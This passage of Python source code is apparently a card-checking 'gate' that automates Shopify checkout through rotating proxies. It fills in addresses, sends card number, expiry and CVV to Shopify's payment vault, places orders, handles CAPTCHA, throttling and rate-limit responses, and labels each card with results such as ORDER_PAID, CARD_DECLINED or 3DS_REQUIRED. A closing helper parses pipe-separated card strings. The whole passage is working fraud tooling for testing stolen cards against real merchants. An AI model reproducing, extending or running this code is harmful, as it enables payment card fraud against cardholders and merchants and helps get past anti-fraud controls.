            # PATCHED: removed no-op _step_sleep('after_graphql_host')

            billing_address = {
                'streetAddress': {
                    'address1': street, 'address2': address2, 'city': city,
                    'countryCode': country_code, 'postalCode': s_zip,
                    'firstName': firstName, 'lastName': lastName,
                    'zoneCode': state, 'phone': phone
                }
            }

            json_data = {
                'query': QUERY_PROPOSAL_SHIPPING,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True}
                                },
                                'options': {}
                            },
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': True
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId,
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'any': True},
                            'lineComponentsSource': None, 'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [],
                        'billingAddress': billing_address
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email, 'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'countryCode': country_code},
                        'rememberMe': False
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None, 'signatureUuid': None,
                        'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []
                    },
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'operationName': 'Proposal'
            }

            response = await session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy)
            resp_text = await response.text()

            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, proxy_status

            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError:
                if response.status in (429, 430, 503):
                    return False, "RATE_LIMITED", gateway, total_price, currency, proxy_status
                return False, "Invalid JSON response", gateway, total_price, currency, proxy_status
            await _step_sleep(proxy_status, 'after_proposal')

            if 'errors' in resp_json and not resp_json.get('data'):
                errors = resp_json.get('errors', [])
                error_msgs = [e.get('message', str(e)) for e in errors[:3]]
                return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency, proxy_status

            try:
                if 'data' not in resp_json:
                    return False, "No data in proposal response", gateway, total_price, currency, proxy_status
                session_data = resp_json['data'].get('session')
                if not session_data:
                    return False, "Session is null", gateway, total_price, currency, proxy_status
                negotiate = session_data.get('negotiate')
                if not negotiate:
                    return False, "Negotiate returned null", gateway, total_price, currency, proxy_status
                result = negotiate.get('result')
                if not result:
                    return False, "Result is null", gateway, total_price, currency, proxy_status

                result_type = result.get('__typename', 'Unknown')
                if result_type == 'CheckpointDenied':
                    return False, "Checkpoint Denied", gateway, total_price, currency, proxy_status
                if result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency, proxy_status
                if result_type == 'NegotiationResultFailed':
                    return False, "Negotiation failed", gateway, total_price, currency, proxy_status

                checkpoint_data = result.get('checkpointData')
                queueToken = result.get('queueToken') or queueToken

                seller_proposal = result.get('sellerProposal')
                if not seller_proposal:
                    return False, "Seller proposal is null", gateway, total_price, currency, proxy_status

                delivery_data = seller_proposal.get('delivery')
                running_total = seller_proposal.get('runningTotal', {}).get('value', {}).get('amount', '0')
                merchandise_subtotal = seller_proposal.get('subtotalBeforeTaxesAndShipping', {}).get('value', {}).get('amount', running_total)
                if merchandise_subtotal is None:
                    merchandise_subtotal = running_total or total_price or '0'

                proposal_currency = None
                try:
                    ct_data = seller_proposal.get('checkoutTotal', {}).get('value', {})
                    if ct_data and ct_data.get('currencyCode'):
                        proposal_currency = ct_data['currencyCode']
                    if not proposal_currency:
                        tt_data = seller_proposal.get('total', {}).get('value', {})
                        if tt_data and tt_data.get('currencyCode'):
                            proposal_currency = tt_data['currencyCode']
                    if not proposal_currency:
                        rt_data = seller_proposal.get('runningTotal', {}).get('value', {})
                        if rt_data and rt_data.get('currencyCode'):
                            proposal_currency = rt_data['currencyCode']
                except:
                    pass
                if proposal_currency:
                    currency = proposal_currency

                checkout_total_data = seller_proposal.get('checkoutTotal', {})
                if checkout_total_data and checkout_total_data.get('value'):
                    total_price = checkout_total_data['value'].get('amount', running_total)
                else:
                    total_data = seller_proposal.get('total', {})
                    if total_data and total_data.get('value'):
                        total_price = total_data['value'].get('amount', running_total)
                    else:
                        total_price = running_total

                signed_handle = None
                signed_handle_expectations = []
                delivery_expectations_data = seller_proposal.get('deliveryExpectations', {})
                if delivery_expectations_data and delivery_expectations_data.get('__typename') == 'FilledDeliveryExpectationTerms':
                    signed_handle_expectations = delivery_expectations_data.get('deliveryExpectations', [])

            except (KeyError, TypeError) as e:
                return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency, proxy_status

            if not delivery_data:
                return False, "No delivery data in proposal", gateway, total_price, currency, proxy_status

            delivery_type = delivery_data.get('__typename', '')
            requires_shipping = True
            delivery_strategy = ''
            shipping_amount = 0.0

            if delivery_type == 'FilledDeliveryTerms':
                delivery_lines = delivery_data.get('deliveryLines', [{}])
                if delivery_lines and len(delivery_lines) > 0:
                    target_merch = delivery_lines[0].get('targetMerchandise', {})
                    merch_lines_v2 = target_merch.get('linesV2', []) if target_merch else []
                    if merch_lines_v2:
                        merch_item = merch_lines_v2[0].get('merchandise', {})
                        if merch_item.get('requiresShipping') == False:
                            requires_shipping = False
                    available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if available_strategies:
                        delivery_strategy = available_strategies[0].get('handle', '')
                        sa = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                        try:
                            shipping_amount = float(sa)
                        except:
                            shipping_amount = 0.0

            if signed_handle_expectations:
                for exp in signed_handle_expectations:
                    if exp.get('deliveryStrategyHandle') == delivery_strategy:
                        signed_handle = exp.get('signedHandle')
                        break
                if not signed_handle and signed_handle_expectations:
                    signed_handle = signed_handle_expectations[0].get('signedHandle')

            try:
                tax_data = seller_proposal.get('tax', {})
                tax_amount, tax_type, tax_detail = _extract_tax_amount(tax_data)
                if tax_amount is None:
                    tax_amount = 0.0
            except Exception as e:
                tax_amount = 0.0

            payment_data = seller_proposal.get('payment', {})
            payment_identifier = None
            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                for method in payment_data.get('availablePaymentLines', []):
                    pm = method.get('paymentMethod', {})
                    if pm.get('paymentMethodIdentifier'):
                        payment_identifier = pm['paymentMethodIdentifier']
                        gateway = pm.get('extensibilityDisplayName') or pm.get('name', 'UNKNOWN')
                        break

            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency, proxy_status

            await _step_sleep(proxy_status, 'delivery')
            if requires_shipping:
                if delivery_strategy:
                    json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                        'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False},
                        'options': {}
                    }
                json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {'lines': [{'stableId': stableId}]}
                json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {'any': True}
                json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
                json_data['variables']['delivery']['noDeliveryRequired'] = []
            else:
                json_data['variables']['delivery'] = {
                    'deliveryLines': [],
                    'noDeliveryRequired': [{'stableId': stableId}],
                    'useProgressiveRates': False,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True
                }
            json_data['variables']['payment']['billingAddress'] = billing_address
            json_data['variables']['taxes'] = _tax_term_input(None, currency, prefer_any=True)
            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone

            response = await session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy)
            resp_text = await response.text()

            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, proxy_status

            delivery_refresh_failed = False
            try:
                del_json = json.loads(resp_text)
                del_result = del_json.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                if not del_result:
                    gql_errs = del_json.get('errors') or []
                    if gql_errs:
                        return False, extract_clean_response(gql_errs[0].get('message', 'DELIVERY_GRAPHQL_ERROR')), gateway, total_price, currency, proxy_status

                new_queue = del_result.get('queueToken')
                if new_queue:
                    queueToken = new_queue
                new_checkpoint = del_result.get('checkpointData')
                if new_checkpoint:
                    checkpoint_data = new_checkpoint

                del_seller = del_result.get('sellerProposal', {}) or {}
                if del_seller:
                    totals = {
                        'running_total': running_total,
                        'total_price': total_price,
                        'merchandise_subtotal': merchandise_subtotal,
                        'currency': currency,
                        'tax_amount': tax_amount,
                    }
                    tax_type, tax_detail, new_tax = _apply_seller_money(del_seller, totals)
                    running_total = totals['running_total']
                    total_price = totals['total_price']
                    merchandise_subtotal = totals.get('merchandise_subtotal', merchandise_subtotal)
                    currency = totals['currency']
                    tax_amount = totals['tax_amount']

                    ship_state = {
                        'delivery_strategy': delivery_strategy,
                        'shipping_amount': shipping_amount,
                        'signed_handle': signed_handle,
                        'requires_shipping': requires_shipping,
                        'rate_pending_ms': 0,
                    }
                    _apply_seller_delivery(del_seller, ship_state)
                    delivery_strategy = ship_state['delivery_strategy']
                    shipping_amount = ship_state['shipping_amount']
                    signed_handle = ship_state.get('signed_handle')
                    requires_shipping = ship_state['requires_shipping']

                    need_rate_wait = (
                        requires_shipping
                        and (
                            tax_type == 'PendingTerms'
                            or not delivery_strategy
                            or ship_state.get('rate_pending_ms')
                        )
                    )
                    if need_rate_wait:
                        delay_ms = 1000
                        if tax_type == 'PendingTerms':
                            delay_ms = int((del_seller.get('tax') or {}).get('pollDelay') or delay_ms)
                        if ship_state.get('rate_pending_ms'):
                            delay_ms = max(delay_ms, int(ship_state['rate_pending_ms']))
                        delay_ms = min(max(delay_ms, 400), 2000)
                        await asyncio.sleep(delay_ms / 1000.0)
                        if requires_shipping and delivery_strategy:
                            json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                                'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False},
                                'options': {}
                            }
                        response = await session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy)
                        resp_text = await response.text()
                        await _step_sleep(proxy_status, 'after_delivery_resolve')
                        del_json = json.loads(resp_text)
                        del_result = del_json.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                        if del_result.get('queueToken'):
                            queueToken = del_result['queueToken']
                        if del_result.get('checkpointData'):
                            checkpoint_data = del_result['checkpointData']
                        del_seller = del_result.get('sellerProposal') or del_seller
                        tax_type, tax_detail, new_tax = _apply_seller_money(del_seller, totals)
                        running_total = totals['running_total']
                        total_price = totals['total_price']
                        currency = totals['currency']
                        tax_amount = totals['tax_amount']
                        _apply_seller_delivery(del_seller, ship_state)
                        delivery_strategy = ship_state['delivery_strategy']
                        shipping_amount = ship_state['shipping_amount']
                        signed_handle = ship_state.get('signed_handle')
                        requires_shipping = ship_state['requires_shipping']

                        if requires_shipping and not delivery_strategy:
                            await asyncio.sleep(min(max(delay_ms, 800), 2500) / 1000.0)
                            response = await session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy)
                            resp_text = await response.text()
                            del_json = json.loads(resp_text)
                            del_result = del_json.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                            if del_result.get('queueToken'):
                                queueToken = del_result['queueToken']
                            if del_result.get('checkpointData'):
                                checkpoint_data = del_result['checkpointData']
                            del_seller = del_result.get('sellerProposal') or del_seller
                            tax_type, tax_detail, new_tax = _apply_seller_money(del_seller, totals)
                            running_total = totals['running_total']
                            total_price = totals['total_price']
                            currency = totals['currency']
                            tax_amount = totals['tax_amount']
                            _apply_seller_delivery(del_seller, ship_state)
                            delivery_strategy = ship_state['delivery_strategy']
                            shipping_amount = ship_state['shipping_amount']
                            signed_handle = ship_state.get('signed_handle')
                            requires_shipping = ship_state['requires_shipping']

                    if requires_shipping and not delivery_strategy:
                        requires_shipping = False

                    sf = del_seller.get('scriptFingerprint')
                    if isinstance(sf, dict):
                        json_data['variables']['scriptFingerprint'] = {
                            'signature': sf.get('signature'),
                            'signatureUuid': sf.get('signatureUuid'),
                            'lineItemScriptChanges': sf.get('lineItemScriptChanges') or [],
                            'paymentScriptChanges': sf.get('paymentScriptChanges') or [],
                            'shippingScriptChanges': sf.get('shippingScriptChanges') or [],
                        }
                    tf = del_seller.get('transformerFingerprintV2')
                    if tf:
                        json_data['variables']['transformerFingerprintV2'] = tf
            except Exception as e:
                if isinstance(e, json.JSONDecodeError) or 'JSONDecodeError' in type(e).__name__:
                    code = _non_json_response_code(getattr(response, 'status', 0), resp_text)
                    return False, code, gateway, total_price, currency, proxy_status
                delivery_refresh_failed = True

            if delivery_refresh_failed:
                return False, "DELIVERY_REFRESH_FAILED", gateway, total_price, currency, proxy_status

            if requires_shipping and delivery_strategy:
                json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                    'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False},
                    'options': {}
                }
            elif not requires_shipping:
                json_data['variables']['delivery'] = {
                    'deliveryLines': [],
                    'noDeliveryRequired': [{'stableId': stableId}],
                    'useProgressiveRates': False,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True
                }

            # PATCHED: removed no-op _step_sleep('after_delivery')

            vault_headers = {
                'Content-Type': 'application/json', 'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/',
                'User-Agent': headers['User-Agent'],
                'sec-ch-ua': headers.get('sec-ch-ua', ''),
                'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin',
            }
            if ident_sig:
                vault_headers['shopify-identification-signature'] = ident_sig

            payload = {
                "credit_card": {
                    "number": cc, "month": int(mes), "year": int(ano),
                    "verification_value": cvv, "start_month": None, "start_year": None,
                    "issue_number": "", "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(url).netloc
            }

            token = None
            for _pci_proxy in (proxy, None):
                try:
                    response = await session.post(pci_url, json=payload, headers=vault_headers, proxy=_pci_proxy)
                    vault_text = await response.text()
                    if vault_text.strip().startswith('{'):
                        token_data = json.loads(vault_text)
                        token = token_data.get('id')
                        if token:
                            break
                except Exception:
                    continue
            if not token:
                return False, 'PCI_TOKEN_FAILED', gateway, total_price, currency, proxy_status

            # PATCHED: removed no-op _step_sleep('after_pci')

            params = {'operationName': 'SubmitForCompletion'}
            submit_attempt_token = f'{attempt_token}-{get_random_string()}'

            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'checkpointData': checkpoint_data,
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {'streetAddress': {
                                'address1': street, 'address2': address2, 'city': city,
                                'countryCode': country_code, 'postalCode': s_zip,
                                'firstName': firstName, 'lastName': lastName,
                                'zoneCode': state, 'phone': phone
                            }},
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False},
                                'options': {'phone': phone}
                            },
                            'targetMerchandiseLines': {'lines': [{'stableId': stableId}]},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': False
                        }] if requires_shipping else [],
                        'noDeliveryRequired': (
                            [] if requires_shipping else [{'stableId': stableId}]
                        ),
                        'useProgressiveRates': bool(requires_shipping),
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'deliveryExpectations': {
                        'deliveryExpectationLines': (
                            [{'signedHandle': signed_handle}] if (requires_shipping and signed_handle) else []
                        )
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId,
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'any': True},
                            'lineComponentsSource': None, 'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': payment_identifier,
                                    'sessionId': token,
                                    'billingAddress': billing_address,
                                    'cardSource': None
                                }
                            },
                            'amount': {'any': True},
                            'dueAt': None
                        }],
                        'billingAddress': billing_address
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email, 'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False
                    },
                    'taxes': _tax_term_input(
                        tax_amount if tax_amount is not None else None,
                        currency,
                        prefer_any=(tax_amount is None),
                    ),
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False},
                    'scriptFingerprint': json_data['variables'].get('scriptFingerprint') or {
                        'signature': None, 'signatureUuid': None,
                        'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []
                    },
                },
                'attemptToken': submit_attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url}
            }
            if json_data['variables'].get('transformerFingerprintV2'):
                submit_variables['input']['transformerFingerprintV2'] = json_data['variables']['transformerFingerprintV2']

            submit_json_data = {
                'query': MUTATION_SUBMIT,
                'variables': submit_variables,
                'operationName': 'SubmitForCompletion'
            }

            response = await session.post(graphql_url, params=params, headers=headers, json=submit_json_data, proxy=proxy)
            text = await response.text()
            await _step_sleep(proxy_status, 'after_submit')

            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, proxy_status

            if "The requested payment method is not available." in text and '"submitForCompletion"' not in text:
                return False, "Payment method not available", gateway, total_price, currency, proxy_status

            try:
                resp_json = json.loads(text)
                submit_data = (resp_json.get('data') or {}).get('submitForCompletion') or {}

                if not submit_data:
                    errors = resp_json.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code') or error.get('extensions', {}).get('code')
                            if code and code != 'INVALID_VARIABLE':
                                return False, code, gateway, total_price, currency, proxy_status
                        msgs = [e.get('message') for e in errors if e.get('message')]
                        if msgs:
                            return False, extract_clean_response('; '.join(msgs)), gateway, total_price, currency, proxy_status
                    return False, f"Empty submit response (HTTP {response.status})", gateway, total_price, currency, proxy_status

                result_type = submit_data.get('__typename', '')

                if result_type == 'SubmitRejected':
                    rej_errors = submit_data.get('errors') or []
                    rej_codes = [e.get('code') for e in rej_errors if e.get('code')]
                    if _reject_needs_term_accept(rej_codes):
                        seller_rej = submit_data.get('sellerProposal') or {}
                        totals = {
                            'running_total': running_total,
                            'total_price': total_price,
                            'merchandise_subtotal': merchandise_subtotal,
                            'currency': currency,
                            'tax_amount': tax_amount,
                        }
                        ship_state = {
                            'delivery_strategy': delivery_strategy,
                            'shipping_amount': shipping_amount,
                            'signed_handle': signed_handle,
                            'requires_shipping': requires_shipping,
                            'rate_pending_ms': 0,
                        }
                        tax_type, tax_detail, new_tax = _apply_seller_money(seller_rej, totals)
                        _apply_seller_delivery(seller_rej, ship_state)
                        running_total = totals['running_total']
                        total_price = totals['total_price']
                        currency = totals['currency']
                        tax_amount = totals['tax_amount']
                        delivery_strategy = ship_state['delivery_strategy']
                        shipping_amount = ship_state['shipping_amount']
                        signed_handle = ship_state.get('signed_handle')
                        requires_shipping = ship_state['requires_shipping']

                        if 'WAITING_PENDING_TERMS' in rej_codes or tax_type == 'PendingTerms' or not (
                            (not requires_shipping) or delivery_strategy
                        ):
                            delay_ms = min(_pending_poll_ms(seller_rej), 2000)
                            await asyncio.sleep(delay_ms / 1000.0)

                        submit_variables['input']['taxes'] = _tax_term_input(
                            tax_amount if new_tax is not None else None,
                            currency,
                            prefer_any=(new_tax is None),
                        )
                        if requires_shipping:
                            if not submit_variables['input'].get('delivery'):
                                submit_variables['input']['delivery'] = {'deliveryLines': [{}], 'noDeliveryRequired': []}
                            if not submit_variables['input']['delivery'].get('deliveryLines'):
                                submit_variables['input']['delivery']['deliveryLines'] = [{}]
                            line0 = submit_variables['input']['delivery']['deliveryLines'][0]
                            if delivery_strategy:
                                line0['selectedDeliveryStrategy'] = {
                                    'deliveryStrategyByHandle': {
                                        'handle': delivery_strategy,
                                        'customDeliveryRate': False,
                                    },
                                    'options': {'phone': phone},
                                }
                            line0['expectedTotalPrice'] = {'any': True}
                            line0['destinationChanged'] = False
                            submit_variables['input']['delivery']['noDeliveryRequired'] = []
                            submit_variables['input']['deliveryExpectations'] = {
                                'deliveryExpectationLines': (
                                    [{'signedHandle': signed_handle}]
                                    if signed_handle else []
                                )
                            }
                        else:
                            submit_variables['input']['delivery'] = {
                                'deliveryLines': [],
                                'noDeliveryRequired': [{'stableId': stableId}],
                                'useProgressiveRates': False,
                                'prefetchShippingRatesStrategy': None,
                                'supportsSplitShipping': True,
                            }
                            submit_variables['input']['deliveryExpectations'] = {
                                'deliveryExpectationLines': []
                            }

                        sf = seller_rej.get('scriptFingerprint') if isinstance(seller_rej, dict) else None
                        if isinstance(sf, dict):
                            submit_variables['input']['scriptFingerprint'] = {
                                'signature': sf.get('signature'),
                                'signatureUuid': sf.get('signatureUuid'),
                                'lineItemScriptChanges': sf.get('lineItemScriptChanges') or [],
                                'paymentScriptChanges': sf.get('paymentScriptChanges') or [],
                                'shippingScriptChanges': sf.get('shippingScriptChanges') or [],
                            }
                        tf = seller_rej.get('transformerFingerprintV2') if isinstance(seller_rej, dict) else None
                        if tf:
                            submit_variables['input']['transformerFingerprintV2'] = tf
                        submit_variables['attemptToken'] = f'{attempt_token}-{get_random_string()}'
                        submit_json_data = {
                            'query': MUTATION_SUBMIT,
                            'variables': submit_variables,
                            'operationName': 'SubmitForCompletion'
                        }
                        response = await session.post(
                            graphql_url, params=params, headers=headers, json=submit_json_data, proxy=proxy
                        )
                        text = await response.text()
                        await _step_sleep(proxy_status, 'after_term_accept')
                        if is_captcha_required(text):
                            return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, proxy_status
                        resp_json = json.loads(text)
                        submit_data = (resp_json.get('data') or {}).get('submitForCompletion') or {}
                        result_type = submit_data.get('__typename', '')

                if not submit_data:
                    return False, f"Empty submit response (HTTP {response.status})", gateway, total_price, currency, proxy_status

                if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                    receipt = submit_data.get('receipt', {})
                    if receipt:
                        receipt_type = receipt.get('__typename', '')
                        if receipt_type == 'ProcessedReceipt':
                            return True, "ORDER_PAID", gateway, total_price, currency, proxy_status
                        elif receipt_type == 'ActionRequiredReceipt':
                            return False, "3DS_REQUIRED", gateway, total_price, currency, proxy_status
                        elif receipt_type == 'FailedReceipt':
                            error = receipt.get('processingError', {})
                            error_type = error.get('__typename', '')
                            if error_type == 'PaymentFailed':
                                code = error.get('code', '')
                                msg = error.get('messageUntranslated', '')
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
                                    return False, msg, gateway, total_price, currency, proxy_status
                                return False, code if code else 'PAYMENT_FAILED', gateway, total_price, currency, proxy_status
                            return False, error_type or 'UNKNOWN_ERROR', gateway, total_price, currency, proxy_status
                        rid = receipt.get('id')
                    else:
                        return False, "SubmitSuccess but no receipt", gateway, total_price, currency, proxy_status

                elif result_type == 'SubmitFailed':
                    reason = submit_data.get('reason', 'Unknown reason')
                    return False, extract_clean_response(reason), gateway, total_price, currency, proxy_status

                elif result_type == 'SubmitRejected':
                    errors = submit_data.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code', '')
                            localized_msg = error.get('localizedMessage', '')
                            non_localized_msg = error.get('nonLocalizedMessage', '')
                            if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and (localized_msg or non_localized_msg):
                                detail = localized_msg or non_localized_msg
                                return False, detail, gateway, total_price, currency, proxy_status
                            if code:
                                return False, code, gateway, total_price, currency, proxy_status
                    return False, "Submit Rejected", gateway, total_price, currency, proxy_status

                elif result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency, proxy_status

                elif result_type == 'CheckpointDenied':
                    return False, "Checkpoint Denied", gateway, total_price, currency, proxy_status

                receipt = submit_data.get('receipt', {})
                if not receipt:
                    return False, "No receipt in submit response", gateway, total_price, currency, proxy_status
                rid = receipt.get('id')
                if not rid:
                    return False, "No receipt ID", gateway, total_price, currency, proxy_status

            except json.JSONDecodeError:
                code = _non_json_response_code(getattr(response, 'status', 0), text)
                return False, code, gateway, total_price, currency, proxy_status
            except Exception as e:
                return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency, proxy_status

            params = {'operationName': 'PollForReceipt'}
            poll_json_data = {
                'query': QUERY_POLL,
                'variables': {'receiptId': rid, 'sessionToken': sst},
                'operationName': 'PollForReceipt'
            }

            await _step_sleep(proxy_status, 'poll')
            final_text = ""
            last_typename = ""
            for i in range(4):
                response = await session.post(graphql_url, params=params, headers=headers, json=poll_json_data, proxy=proxy)
                final_text = await response.text()

                if response.status in (429, 430, 503):
                    return False, "RATE_LIMITED", gateway, total_price, currency, proxy_status
                if is_captcha_required(final_text):
                    return False, "CARD_DECLINED", gateway, total_price, currency, proxy_status

                try:
                    poll_json = json.loads(final_text)
                except json.JSONDecodeError:
                    return False, "UNPARSEABLE_RESPONSE", gateway, total_price, currency, proxy_status

                receipt_data = poll_json.get('data', {}).get('receipt', {})
                if not receipt_data:
                    errors = poll_json.get('errors') or []
                    if errors:
                        return False, errors[0].get('message', 'UNKNOWN_ERROR'), gateway, total_price, currency, proxy_status
                    return False, "EMPTY_POLL_RESPONSE", gateway, total_price, currency, proxy_status

                typename = receipt_data.get('__typename', '')
                last_typename = typename

                if typename == 'ProcessedReceipt':
                    return True, "ORDER_PAID", gateway, total_price, currency, proxy_status
                elif typename == 'FailedReceipt':
                    error = receipt_data.get('processingError', {})
                    error_type = error.get('__typename', '')
                    if error_type == 'PaymentFailed':
                        code = error.get('code', '')
                        msg = error.get('messageUntranslated', '')
                        if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
                            return False, msg, gateway, total_price, currency, proxy_status
                        return False, code if code else 'PAYMENT_FAILED', gateway, total_price, currency, proxy_status
                    elif error_type == 'InventoryClaimFailure':
                        return False, "INVENTORY_CLAIM_FAILURE", gateway, total_price, currency, proxy_status
                    elif error_type == 'InventoryReservationFailure':
                        return False, "INVENTORY_RESERVATION_FAILURE", gateway, total_price, currency, proxy_status
                    elif error_type == 'OrderCreationFailure':
                        return False, "ORDER_CREATION_FAILURE", gateway, total_price, currency, proxy_status
                    code = error.get('code') or error_type or 'UNKNOWN_ERROR'
                    return False, code, gateway, total_price, currency, proxy_status
                elif typename == 'ActionRequiredReceipt':
                    return False, "3DS_REQUIRED", gateway, total_price, currency, proxy_status
                elif typename in ('ProcessingReceipt', 'WaitingReceipt'):
                    # PATCHED: tighter poll interval
                    poll_delay = receipt_data.get('pollDelay', 200) / 1000.0
                    await asyncio.sleep(min(poll_delay, 0.4))
                    continue
                else:
                    return False, f"UNHANDLED_RECEIPT_{typename}", gateway, total_price, currency, proxy_status

            if last_typename in ('ProcessingReceipt', 'WaitingReceipt'):
                return False, "STILL_PROCESSING", gateway, total_price, currency, proxy_status
            return False, "STILL_PROCESSING", gateway, total_price, currency, proxy_status

    except asyncio.TimeoutError:
        if proxy_str:
            proxy_status = "Dead"
        return False, "REQUEST_TIMEOUT", gateway, total_price, currency, proxy_status
    except aiohttp.ClientError as e:
        if proxy_str:
            proxy_status = "Dead"
        return False, f"CONNECTION_ERROR: {str(e)}", gateway, total_price, currency, proxy_status
    except RuntimeError as e:
        if proxy_str:
            proxy_status = "Dead"
        return False, str(e), gateway, total_price, currency, proxy_status
    except Exception as e:
        if proxy_str and is_proxy_connection_error(e):
            proxy_status = "Dead"
        return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency, proxy_status


def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
